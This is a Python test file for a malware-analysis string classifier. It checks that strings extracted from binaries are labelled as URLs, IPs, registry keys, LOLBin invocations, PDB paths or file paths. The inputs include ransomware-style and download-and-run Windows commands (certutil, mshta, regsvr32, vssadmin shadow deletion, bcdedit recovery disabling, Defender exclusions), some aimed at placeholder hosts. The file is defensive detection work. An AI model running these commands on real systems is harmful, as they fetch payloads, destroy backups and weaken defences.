import time

from gokdogan.strings_ext import analyze_strings, classify, extract_strings


def test_extract_ascii_and_wide():
    data = b"\x00\x01AAAAAAAA\x00\x02" + "wide-string!".encode("utf-16le") + b"\x00\x00"
    found, total = extract_strings(data, min_length=6)
    texts = [t for t, _, _ in found]
    assert "AAAAAAAA" in texts
    assert "wide-string!" in texts
    assert total == 2


def test_classify_url():
    assert classify("http://evil.example/payload.bin") == "url"
    assert classify("https://203.0.113.7:8443/gate.php") == "url"


def test_classify_ipv4_rejects_version_lookalikes():
    assert classify("203.0.113.7") == "ipv4"
    assert classify("6.1.7601.17514") is None
    assert classify("999.1.1.1") is None


def test_classify_registry_and_command():
    assert classify(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run") == "registry"
    assert classify("cmd.exe /c whoami") == "command"
    assert classify("powershell -enc SQBFAFgA") == "command"
    assert classify("vssadmin delete shadows /all /quiet") == "command"


def test_lolbin_invocations_are_commands():
    assert classify("regsvr32 /s /n /u /i:http://203.0.113.5/a.sct scrobj.dll") == "command"
    assert classify("powershell -nop -w hidden -c IEX (New-Object Net.WebClient)") == "command"
    assert classify("certutil -urlcache -split -f http://203.0.113.5/a.exe") == "command"
    assert classify("bitsadmin /transfer job http://203.0.113.5/a.exe C:/a.exe") == "command"
    assert classify("mshta http://203.0.113.5/a.hta") == "command"
    assert classify("schtasks /create /tn upd /tr C:/a.exe /sc onlogon") == "command"


def test_invocations_spelled_with_exe_or_a_path_are_commands():
    for text in ("bcdedit.exe /set {current} testsigning on",
                 r"C:\Windows\System32\bcdedit.exe /set {current} safeboot minimal",
                 "vssadmin.exe Delete Shadows /For=D: /Oldest",
                 "wmic.exe shadowcopy where id=1 delete",
                 "wbadmin.exe delete catalog",
                 "wevtutil.exe cl Application"):
        assert classify(text) == "command", text


def test_bcdedit_that_installers_run_is_not_a_command():
    # Docker Desktop's help text tells the user to enable Hyper-V this way.
    for text in ("bcdedit /set hypervisorlaunchtype auto", "bcdedit -set hypervisorlaunchtype auto",
                 "bcdedit.exe /set {current} nx OptIn", "bcdedit /set {current} bootmenupolicy Standard"):
        assert classify(text) != "command", text


def test_bcdedit_that_disables_recovery_or_checks_is_a_command():
    for text in ("bcdedit /set {default} recoveryenabled No", "bcdedit.exe -set {default} recoveryenabled No",
                 "bcdedit /set testsigning on", "bcdedit /deletevalue {default} safeboot",
                 "bcdedit /delete {current}"):
        assert classify(text) == "command", text


def test_powershell_parameter_prefixes_are_commands():
    # PowerShell accepts any unambiguous prefix of a parameter name.
    for text in ("powershell.exe -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
                 "powershell -ep bypass -File a.ps1",
                 "powershell -w 1 -c Get-Date",
                 "powershell -NoProfile -NonInteractive -Command %s",
                 r"powershell -Command Add-MpPreference -ExclusionPath C:\ProgramData"):
        assert classify(text) == "command", text


def test_lolbin_run_from_a_user_writable_folder_is_a_command():
    assert classify(r"rundll32.exe %TEMP%\x.dll,Start") == "command"
    assert classify(r"regsvr32 /s C:\Users\Public\x.dll") == "command"


def test_classification_stays_linear_on_hostile_strings():
    # One long printable run repeating a tool name used to take tens of
    # seconds (unbounded gaps after each name); it must stay well under that.
    for token in ("powershell ", "rundll32 ", "schtasks ", "certutil ", "wmic ", "bcdedit "):
        text = token * 20_000
        start = time.perf_counter()
        classify(text)
        assert time.perf_counter() - start < 2.0, token


def test_bare_lolbin_names_are_not_commands():
    # Windows components name these tools constantly; only the invocation counts.
    assert classify(r"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL") == "lolbin"
    assert classify("regsvr32.exe") == "lolbin"
    assert classify("powershell.exe") == "lolbin"
    assert classify("whoami") == "lolbin"


def test_classify_pdb_and_path():
    assert classify(r"C:\Users\dev\project\Release\stealer.pdb") == "pdb"
    assert classify(r"C:\ProgramData\svchost.exe") == "path"


def test_noise_is_dropped():
    assert classify("http://www.microsoft.com/pki/certs") is None
    assert classify("http://crl.digicert.com/sha2.crl") is None


def test_analyze_deduplicates_and_counts():
    blob = (b"http://evil.example/a\x00" * 5) + b"padding-padding"
    hits, stats = analyze_strings(blob, min_length=6)
    urls = [h for h in hits if h.category == "url"]
    assert len(urls) == 1
    assert stats["url"] == 5
